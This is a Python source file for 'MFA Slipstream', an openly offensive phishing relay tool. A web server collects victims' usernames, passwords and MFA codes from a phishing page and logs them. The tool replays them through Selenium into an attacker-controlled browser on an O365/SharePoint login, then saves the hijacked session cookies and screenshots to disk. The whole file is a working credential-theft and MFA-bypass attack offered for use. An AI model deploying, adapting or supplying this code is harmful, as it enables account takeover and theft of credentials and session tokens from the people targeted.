#!/usr/bin/python
"""
         ___           ___          __
  __ _  / _/__ _  ___ / (_)__  ___ / /________ ___ ___ _
 /  ' \/ _/ _ `/ (_-</ / / _ \(_-</ __/ __/ -_) _ `/  ' \
/_/_/_/_/ \_,_/ /___/_/_/ .__/___/\__/_/  \__/\_,_/_/_/_/
                       /_/
-
MFA Slipstream - Phishing 2.0 - Phishing Your Way Past MFA

Useful resources:
    1 Month free trial of O365 Enterprise: https://portal.office.com/Signup/MainSignup15.aspx?Dap=
                                            False&QuoteId=79a957e9-ad59-4d82-b787-a46955934171&ali=1
    Firefox WebDriver - Requires https://github.com/mozilla/geckodriver/releases be in PATH
    Selenium docs: http://selenium-python.readthedocs.io/

Run with: sudo python mfa_slipstream.py

License: MIT (see LICENSE)
"""

__author__ = '@decidedlygray'
__version__ = '2017.6'
__license__ = 'MIT'

import base64
import time
import datetime
import pickle
# Selenium Imports
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import WebDriverException, NoSuchElementException
# Bottle Import - Check if it exists, otherwise download it
from bottle import Bottle, static_file, request, response, template, ServerAdapter

# Create Bottle instance
app = Bottle()

# Boilerplate scaffolding
@app.error(404)
def error404(error):
    return 'Nothing to see here... Move along.'

index_html = '''Howdy <strong>{{ author }}</strong>.'''
@app.route('/')
def index():
    return template(index_html, author='Stranger')

PROTECTED_RESOURCE='https://targetsite.sharepoint.com/SitePages/Home.aspx'
TARGET_EMAIL_DOMAIN='widgetscorp.co'
##########################################################################
# STAGE 0 - Prepopulate WebDriver with a good session
##########################################################################
def go_to_signin(known_email, driver):
    """known_email should either be the targets email, or clear it on landing using selenium"""
    # driver = webdriver.Firefox()
    # This will land us on login.microsoft.com w proper new, unauthenticated session set up
    driver.get(PROTECTED_RESOURCE)
    elem = driver.find_element(by='id', value='cred_userid_inputtext')
    elem.clear()
    #print('DBG :: Sending email: '+known_email)
    #elem.send_keys(known_email)
    elem.send_keys('test@'+TARGET_EMAIL_DOMAIN)
    elem.send_keys(Keys.TAB)
    # We will now be redirected to victim's branded login page
    time.sleep(5)
    elem=driver.find_element(by='id', value='userNameInput')
    elem.clear()

##########################################################################
# STAGE 1 - COLLECT USERNAME AND PASSWORD AND PASS ON TO LOGIN PORTAL
##########################################################################
def do_usernamepass_login(u, p_b64encoded, driver):
    try:
        # Enter the username
        elem=driver.find_element(by='id', value='userNameInput')
        elem.clear()
        elem.send_keys(u)
        # Enter the password
        elem=driver.find_element(by='id', value='passwordInput')
        elem.clear()
        elem.send_keys(base64.b64decode(p_b64encoded))
        # Submit
        elem.send_keys(Keys.RETURN)
        time.sleep(2)
    except NoSuchElementException:
        print('Hit NoSuchElementException. Likely requested stuff out of order. Giving OneWaySMS to move things along...')
        return 'OneWaySMS'
    # Get the auth type
    try:
        #time.sleep(2)
        # MS O365 specific JavaScript for detecting authentication type
        auth_type = driver.execute_script('return Constants.StrongAuth.Context["DefaultMethod"]["AuthMethodId"]')
        if auth_type in ('OneWaySMS', 'TwoWayVoiceMobile'):
            l2_phone = driver.execute_script('return Constants.StrongAuth.Context["DefaultMethod"]["AuthMethodDeviceId"]')
            l2_phone = l2_phone[-2:]
            auth_type = auth_type+':'+l2_phone
    except WebDriverException:
        print('! Hit WebDriverException')
        auth_type = 'BadCredentials'
    print('Auth type detected: '+auth_type)
    return auth_type


@app.route('/dossologin', method=['OPTIONS', 'GET'])
def dossologin():
    if request.method == 'OPTIONS':
        return {}
    else:
        request_params = request.query.decode()
        user_username = request_params['username']
        user_pass = request_params['pass']
        print('dossologin =======================================')
        print('User provided username: '+user_username)
        print('User provided password: '+user_pass)
        log('Username: '+str(user_username))
        log('Password: '+str(user_pass))
        auth_type = do_usernamepass_login(user_username, user_pass, global_driver)
        return auth_type

##########################################################################
# STAGE 2 - COLLECT MFA TOKEN OR ACCEPT NOTIFCATION
##########################################################################
def do_mfa_code_entry(code, driver):
    """Uses selenium to enter the MFA token information into the attacker browser"""
    # driver = webdriver.Firefox()
    elem = driver.find_element(by='id', value='tfa_code_inputtext')
    elem.clear()
    elem.send_keys(code)
    elem.send_keys(Keys.RETURN)
    log('MFA code: '+str(code))
    time.sleep(5)
    print('Saving creds and screenshot')
    quicksave()


@app.route('/domfa', method=['OPTIONS', 'GET'])
def domfa():
    """
    Web app method to accept, decode and parse parameters related
    to loggin in with MFA token. Calls do_mfa_code_entry to enter MFA.
    """
    if request.method == 'OPTIONS':
        return {}
    else:
        request_params = request.query.decode()
        user_mfa_code = request_params['code']
        print('domfa =======================================')
        print('User provided MFA Auth Code: '+user_mfa_code)
        do_mfa_code_entry(user_mfa_code, global_driver)
        return 'Ok'

@app.route('/checkload', method=['OPTIONS', 'GET'])
def checkload():
    """
    If the user doesn't have a sign in button, the phishing page will poll
    this to see if the page has been loaded
    """
    if request.method == 'OPTIONS':
        return {}
    else:
        currentURL = global_driver.current_url
        print('Current URL is: '+currentURL)
        if currentURL == PROTECTED_RESOURCE:
            return '1'
            print('Saving creds and screenshot')
            time.sleep(3)
            quicksave()
        else:
            return '0'

@app.route('/quicksave', method=['OPTIONS', 'GET'])
def quicksave():
    """Calling this will save cookies and whatnot to disk for later user"""
    print('FLASHSAVE: Cookies and screenshot')
    mfa_cookies = global_driver.get_cookies()
    print('  flashsaving cookies: '+str(mfa_cookies))
    save_obj(mfa_cookies,'cookies_'+get_timestamp()+'.txt') # load using add_cookies
    global_driver.get_screenshot_as_file('saves/screenie'+get_timestamp()+'.png')
    return '0x00000000'

##########################################################################
# BOTTLE CONFIGURATION/SETUP STUFF
##########################################################################
# Enable CORS - Future TODO: Communicate back to JavaScript auth method
#       and have the login portal properly set up auth method
# From: https://gist.github.com/richard-flosi/3789163
@app.hook('after_request')
def enable_cors():
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Origin, Accept, Content-Type, X-Requested-With, X-CSRF-Token'

# Enable SSL w Self Signed Cert
#   Source: https://github.com/mfm24/miscpython/blob/master/bottle_ssl.py
#   Generate a cert: openssl req -new -x509 -keyout mfa_slipstream.pem -out mfa_slipstream.pem -days 365 -nodes
class SSLWSGIRefServer(ServerAdapter):
    def run(self, handler):
        from wsgiref.simple_server import make_server, WSGIRequestHandler
        import ssl
        if self.quiet:
            class QuietHandler(WSGIRequestHandler):
                def log_request(*args, **kw): pass
            self.options['handler_class'] = QuietHandler
        srv = make_server(self.host, self.port, handler, **self.options)
        srv.socket = ssl.wrap_socket (
         srv.socket,
         keyfile='mfa_slipstream.pem',
         certfile='mfa_slipstream.pem',  # path to certificate
         server_side=True)
        srv.serve_forever()


##########################################################################
# UTILITY FUNCTIONS
##########################################################################
def get_timestamp():
    return '{:%Y-%m-%d %H-%M-%S}'.format(datetime.datetime.now())

def log(msg):
    f = open('mfa_slipstream.log','a')
    f.write('[*] {tstamp} : {msg}\n'.format(tstamp=get_timestamp(),msg=msg))
    f.close()

def print_banner():
    print("         ___           ___          __")
    print("  __ _  / _/__ _  ___ / (_)__  ___ / /________ ___ ___ _")
    print(" /  ' \/ _/ _ `/ (_-</ / / _ \(_-</ __/ __/ -_) _ `/  ' \\")
    print("/_/_/_/_/ \_,_/ /___/_/_/ .__/___/\__/_/  \__/\_,_/_/_/_/")
    print("                       /_/")
    print(__author__ + ' ' + __version__)
    print('-')

def save_obj(obj, name):
    with open('saves/'+ name + '.pkl', 'wb') as f:
        pickle.dump(obj, f, pickle.HIGHEST_PROTOCOL)

def load_obj(name):
    with open('saves/' + name + '.pkl', 'rb') as f:
        return pickle.load(f)

##########################################################################
# LET IT RIP!
##########################################################################
print_banner()

# print('Adding Cookies ImportExport Extension')
# profile=webdriver.FirefoxProfile()
# profile.add_extension(extension='cookies_exportimport-1.0-fx.xpi')

print('Launching FireFox...')
global_driver = webdriver.Firefox(firefox_profile=profile)
#global_driver = webdriver.Firefox()
go_to_signin('test@'+TARGET_EMAIL_DOMAIN, global_driver)

print('Starting Bottle...')
# srv = SSLWSGIRefServer(host="mfaslipstream.com", port=443) #internal testing
srv = SSLWSGIRefServer(host="0.0.0.0", port=443)
# srv = SSLWSGIRefServer(host="127.0.0.1", port=8445)
# app.run(server=srv)
print('')
print('Waiting for victim credentials...')
# app.run(host='localhost', port=8282, debug=True, reloader=True)
app.run(server=srv, quiet=True)






"""
##########################################################################
# TROUBLESHOOTING
##########################################################################

Error:  File "C:\Python27\lib\ssl.py", line 554, in __init__
            self._context.load_cert_chain(certfile, keyfile)
        IOError: [Errno 2] No such file or directory
Cause: You are missing the SSL .pem certificate file

Error:   File "C:\Python27\lib\socket.py", line 228, in meth
            return getattr(self._sock,name)(*args)
        socket.gaierror: [Errno 11004] getaddrinfo failed
Cause: Check your srv variable. Are you assigning a host and port that make
    sense? If you are using a bogus tld, make sure it has a hosts entry both
    on your victim AND the server running the slipstream.
"""
